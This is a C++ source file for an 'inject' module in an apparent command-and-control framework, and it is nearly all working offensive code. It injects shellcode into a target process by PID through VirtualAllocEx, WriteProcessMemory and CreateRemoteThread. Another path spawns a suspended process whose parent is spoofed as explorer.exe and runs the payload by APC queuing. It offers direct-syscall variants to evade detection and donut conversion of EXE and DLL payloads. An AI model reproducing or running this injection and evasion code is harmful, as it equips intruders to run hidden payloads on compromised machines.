#include "Inject.hpp"

#include <cstring>

#include "Common.hpp"
#include "Tools.hpp"


using namespace std;

constexpr std::string_view moduleName = "inject";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32

#include <tlhelp32.h>
#include <psapi.h>

#include <syscall.hpp>

__declspec(dllexport) Inject* A_InjectConstructor() 
{
    return new Inject();
}

#else

__attribute__((visibility("default"))) Inject* InjectConstructor() 
{
    return new Inject();
}

#endif


Inject::Inject()
#ifdef BUILD_TEAMSERVER
	: ModuleCmd(std::string(moduleName), moduleHash)
#else
	: ModuleCmd("", moduleHash)
#endif
{
	m_processToSpawn = "notepad.exe";
	m_useSyscall = false;
}

Inject::~Inject()
{
}

int Inject::initConfig(const nlohmann::json &config)
{
	for (auto& it : config.items())
	{
		if(it.key()=="process")
			m_processToSpawn = it.value();
		else if(it.key()=="syscall")
			m_useSyscall = true;
	}

	return 0;
}

std::string Inject::getInfo()
{
	std::string info;
#ifdef BUILD_TEAMSERVER
	info += "inject:\n";
	info += "Inject shellcode in the pid process. For linux must be root or at least have ptrace capability.\n";
	info += "No output is provided.\n";
	info += "Use -r to use a shellcode file.\n";
	info += "If -e or -d are given, use donut to create the shellcode.\n";
	info += "If pid is negative a new process is created for the injection.\n";
	info += "exemple:\n";
	info += "- inject -r ./calc.bin 2568\n";
	info += "- inject -e ./beacon.exe pid arg1 arg2\n";
	info += "- inject -d ./calc.dll pid method arg1 arg2\n";
#endif
	return info;
}

int Inject::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
	if (splitedCmd.size() >= 4)
	{
		bool donut=false;
		std::string inputFile=splitedCmd[2];
		std::string method;
		std::string args;
		int pid=-1;

		try
        {
            pid = stoi(splitedCmd[3]);
        }
        catch (...)
        {
            std::string msg = "Pid must be an integer.\n";
			c2Message.set_returnvalue(msg);
			return -1;
        }

		if(splitedCmd[1]=="-e")
		{
			donut=true;
			for (int idx = 4; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-d")
		{
			donut=true;
			if(splitedCmd.size() > 4)
				method=splitedCmd[4];
			else
			{
				std::string msg = "Method is mandatory for DLL.\n";
				c2Message.set_returnvalue(msg);
				return -1;
			}
			for (int idx = 5; idx < splitedCmd.size(); idx++) 
			{
				if(!args.empty())
					args+=" ";
				args+=splitedCmd[idx];
			}
		}
		else if(splitedCmd[1]=="-r")
		{
		}
		else
		{
			std::string msg = "One of the tags, -r, -e or -d must be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		if(inputFile.empty())
		{
			std::string msg = "A file name have to be provided.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::ifstream myfile;
		myfile.open(inputFile);

		if(!myfile)
		{
			std::string newInputFile=m_toolsDirectoryPath;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile)
		{
			std::string newInputFile=m_windowsBeaconsDirectoryPath;
			newInputFile+=inputFile;
			myfile.open(newInputFile, std::ios::binary);
			inputFile=newInputFile;
		}

		if(!myfile) 
		{
			std::string msg = "Couldn't open file.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}
		myfile.close();

		std::string payload;
		if(donut)
			creatShellCodeDonut(inputFile, method, args, payload);
		else
		{
			std::ifstream input(inputFile, std::ios::binary);
			std::string payload_(std::istreambuf_iterator<char>(input), {});
			payload=payload_;
		}

		if(payload.size()==0)
		{
			std::string msg = "Something went wrong. Payload empty.\n";
			c2Message.set_returnvalue(msg);
			return -1;
		}

		std::string cmd;
		for (int idx = 1; idx < splitedCmd.size(); idx++) 
		{
			cmd+=splitedCmd[idx];
			cmd+=" ";
		}

		c2Message.set_pid(pid);
		c2Message.set_cmd(cmd);
		c2Message.set_instruction(splitedCmd[0]);
		c2Message.set_inputfile(inputFile);
		c2Message.set_data(payload.data(), payload.size());
	}
	else
	{
		c2Message.set_returnvalue(getInfo());
		return -1;
	}
#endif
	return 0;
}

#ifdef _WIN32


std::string static inline inject(int pid, const std::string& payload, bool useSyscall)
{
	std::string result;

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	if (processHandle)
	{
		if(useSyscall)
		{
			PVOID remoteBuffer;
			SIZE_T sizeToAlloc = payload.size();

			remoteBuffer=NULL;
			Sw3NtAllocateVirtualMemory_(processHandle, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

			SIZE_T NumberOfBytesWritten;
			Sw3NtWriteVirtualMemory_(processHandle, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
			
			ULONG oldAccess;
			Sw3NtProtectVirtualMemory_(processHandle, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);

			HANDLE hThread;
			Sw3NtCreateThreadEx_(&hThread, 0x1FFFFF, (POBJECT_ATTRIBUTES)NULL, processHandle, (void*) remoteBuffer, (PVOID)NULL, FALSE, 0, 0, 0, (PPS_ATTRIBUTE_LIST)NULL);

			Sw3NtClose_(hThread);
			Sw3NtClose_(processHandle);
			
			result += "Process injected.";
		}
		else
		{
			PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

			WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);

			DWORD oldprotect = 0;
			VirtualProtectEx(processHandle, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);

			HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

			CloseHandle(remoteThread);
			CloseHandle(processHandle);
			result += "Process injected.";

		}
	}
	else
		result += "OpenProcess failed.";

	return result;
}


// std::string static inline selfInject(const std::string& payload)
// {
// 	std::string result;
//     DWORD pid = GetCurrentProcessId();
//     HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
// 
// 	if (processHandle)
// 	{
// 		PVOID remoteBuffer = VirtualAlloc(NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
// 		WriteProcessMemory(processHandle, remoteBuffer, payload.data(), payload.size(), NULL);
// 		DWORD oldprotect = 0;
// 		VirtualProtect(remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);
// 		HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
// 		CloseHandle(remoteThread);
// 		CloseHandle(processHandle);
// 		result += "Self injected.";
// 	}
// 	else
// 		result += "OpenProcess failed.";
// 
//     return result;
// }


DWORD GetPidByName(const char * pName) 
{
	PROCESSENTRY32 pEntry;
	HANDLE snapshot;

	pEntry.dwSize = sizeof(PROCESSENTRY32);
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (Process32First(snapshot, &pEntry) == TRUE) 
	{
		while (Process32Next(snapshot, &pEntry) == TRUE) 
		{
			if (_stricmp(pEntry.szExeFile, pName) == 0) 
			{
				return pEntry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


// https://cocomelonc.github.io/tutorial/2021/11/20/malware-injection-4.html
std::string static inline spawnInject(const std::string& payload, const std::string& processToSpawn, bool useSyscall)
{
	std::string result;

	// Spoof parent ID to set explorer.exe
	DWORD dwPid = GetPidByName("explorer.exe");
	if (dwPid == 0)
		dwPid = GetCurrentProcessId();

	// create fresh attributelist
	SIZE_T cbAttributeListSize = 0;
	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

	// copy and spoof parent process ID
	HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	UpdateProcThreadAttribute(pAttributeList,
							0,
							PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
							&hParentProcess,
							sizeof(HANDLE),
							NULL,
							NULL);

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFOEX startupInfoEx = { sizeof(startupInfoEx) };
	startupInfoEx.lpAttributeList = pAttributeList;

	if (CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, NULL, NULL, &startupInfoEx.StartupInfo, &piProcInfo))
	{
		if(useSyscall)
		{
			PVOID remoteBuffer;
			SIZE_T sizeToAlloc = payload.size();

			remoteBuffer=NULL;
			Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

			SIZE_T NumberOfBytesWritten;
			Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
			
			ULONG oldAccess;
			Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);

			Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, (PIO_STATUS_BLOCK)NULL, NULL);
			Sw3NtResumeThread_(piProcInfo.hThread, (PULONG)NULL);

			result += "Process injected.";
		}
		else
		{
			PVOID remoteBuffer = VirtualAllocEx(piProcInfo.hProcess, NULL, payload.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

			WriteProcessMemory(piProcInfo.hProcess, remoteBuffer, payload.data(), payload.size(), NULL);

			DWORD oldprotect = 0;
			VirtualProtectEx(piProcInfo.hProcess, remoteBuffer, payload.size(), PAGE_EXECUTE_READ, &oldprotect);

			PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteBuffer;
			QueueUserAPC((PAPCFUNC)apcRoutine, piProcInfo.hThread, NULL);
			ResumeThread(piProcInfo.hThread);
			result += "Process injected.";
		}
	}
	else
	{
		result += "CreateProcess failed.";
	}

	DeleteProcThreadAttributeList(pAttributeList);
	CloseHandle(hParentProcess);

	return result;
}


#endif


int Inject::process(C2Message &c2Message, C2Message &c2RetMessage)
{
	const std::string shellcode = c2Message.data();
	int pid = c2Message.pid();

	std::string result;
	if(pid>0)
	{
		result = inject(pid, shellcode, m_useSyscall);
	}
	else
	{
		std::string processToSpawn="notepad.exe";
		if(!m_processToSpawn.empty())
			processToSpawn=m_processToSpawn;
		result = spawnInject(shellcode, processToSpawn, m_useSyscall);
	}

	// variantes
	// nt api (ntdll)
	// nt write virtual memory
	// nt map view...
	// nt creat thread ex
	// bcp d autre

	c2RetMessage.set_instruction(c2RetMessage.instruction());
	c2RetMessage.set_cmd(c2Message.cmd());
	c2RetMessage.set_returnvalue(result);

	return 0;
}

